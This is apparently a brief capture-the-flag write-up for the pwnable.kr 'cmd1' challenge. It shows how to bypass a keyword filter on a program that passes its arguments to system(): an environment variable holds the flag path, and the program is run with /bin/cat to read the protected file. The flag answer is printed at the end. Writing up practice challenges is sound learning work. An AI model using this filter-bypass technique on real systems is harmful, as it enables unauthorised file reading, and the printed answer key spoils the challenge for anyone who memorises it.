# cmd1

1. Login into server with passwd: `guest`:
```
$ ssh cmd1@pwnable.kr -p2222
$ scp -P2222 cmd1@pwnable.kr:~/* .
```

Simple task, from the source code we can easily see that for some arguments (not containing words `sh`, `tmp` and `flag`) we get `system()` call with input arguments.

I logged into the server and did the following:
```
cmd1@prowl:~$ export fla=/home/cmd1/flag
cmd1@prowl:~$ ./cmd1 "/bin/cat \$fla"
mommy now I get what PATH environment is for :)
```

I just set an env variable `fla` containing full path to `flag` file and run the `cmd1` with `cat` arguments on `fla`.  


```
FLAG: {mommy now I get what PATH environment is for :)}
```